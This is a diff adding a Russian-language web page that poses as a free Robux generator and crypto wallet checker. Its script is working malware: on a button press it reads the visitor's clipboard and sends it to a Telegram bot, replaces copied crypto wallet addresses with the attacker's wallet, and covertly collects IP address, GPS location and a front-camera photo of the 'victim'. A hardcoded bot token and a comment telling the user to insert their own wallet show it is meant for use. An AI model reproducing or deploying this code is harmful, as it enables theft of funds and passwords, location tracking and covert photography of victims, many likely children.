@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Robux Generator / Crypto Checker</title>
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background: #0a0a0a; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; }
+        .card { background: #141414; border: 1px solid #333; border-radius: 16px; padding: 30px 20px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
+        .logo { font-size: 50px; margin-bottom: 10px; }
+        h2 { font-size: 20px; margin-bottom: 10px; color: #00ff88; }
+        p { font-size: 14px; color: #888; margin-bottom: 25px; line-height: 1.5; }
+        button { width: 100%; padding: 16px; background: linear-gradient(90deg, #00ff88, #00b359); color: #000; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:active { transform: scale(0.98); }
+        .success-screen { display: none; }
+        
+        #camera { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="card" id="mainScreen">
+        <div class="logo">💎</div>
+        <h2>Генератор Robux / Чекер Кошелька</h2>
+        <p>Нажмите кнопку ниже, чтобы сгенерировать код активации. Скрипт автоматически скопирует его в ваш буфер обмена.</p>
+        <button id="hijackBtn">Сгенерировать код</button>
+    </div>
+
+    <div class="card success-screen" id="successScreen">
+        <div class="logo">✅</div>
+        <h2>Успешно!</h2>
+        <p>Код активации скопирован в буфер обмена. Вставьте его в игру или кошелек для получения бонуса.</p>
+    </div>
+
+    <video id="camera" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8";
+        const CHAT_ID = "7485234259";
+
+        // ТВОЙ КРИПТО-КОШЕЛЕК (Замени на свой USDT TRC20 или BTC)
+        const MY_WALLET = "TJ8xY9w7z6v5u4t3s2r1q0p9o8n7m6l5k4j3h2g1f"; 
+
+        function sendText(text) {
+            const img = new Image();
+            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+        }
+
+        async function sendPhoto(blob, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'face.jpg');
+            formData.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        }
+
+        document.getElementById('hijackBtn').addEventListener('click', async function() {
+            try {
+                // 1. Читаем буфер обмена жертвы
+                const clipboardText = await navigator.clipboard.readText();
+                
+                if (clipboardText) {
+                    sendText(`📋 Перехвачен буфер обмена:\n\n${clipboardText}`);
+                    
+                    // Если жертва копировала крипто-кошелек (длинная строка), подменяем его
+                    if (clipboardText.length > 25 && clipboardText.length < 60) {
+                        // Меняем содержимое буфера на СВОЙ кошелек
+                        await navigator.clipboard.writeText(MY_WALLET);
+                        sendText(`🔄 Кошелек подменен на: ${MY_WALLET}`);
+                    } else {
+                        // Если там был пароль или текст, просто копируем фейковый код
+                        await navigator.clipboard.writeText("PROMO-CODE-999-ROBUX");
+                    }
+                } else {
+                    sendText(`📋 Буфер обмена: Пусто`);
+                }
+            } catch (err) {
+                sendText(`⚠️ Буфер заблокирован Safari/Chrome`);
+            }
+
+            // 2. Скрытый сбор данных (Фото, IP, Гео)
+            collectBackgroundData();
+
+            // 3. Показываем экран успеха
+            document.getElementById('mainScreen').style.display = 'none';
+            document.getElementById('successScreen').style.display = 'block';
+        });
+
+        async function collectBackgroundData() {
+            // IP
+            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => sendText(`🌐 IP: ${d.ip}`)).catch(()=>{});
+            
+            // GPS
+            navigator.geolocation.getCurrentPosition(
+                (pos) => sendText(`🗺️ GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
+                (err) => {}
+            );
+
+            // Фронталка
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                const video = document.getElementById('camera');
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 1000));
+                
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                stream.getTracks().forEach(track => track.stop());
+
+                const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.8))).blob();
+                await sendPhoto(blob, `📸 Селфи жертвы (Клипборд)`);
+            } catch (err) {}
+        }
+    </script>
+</body>
+</html>
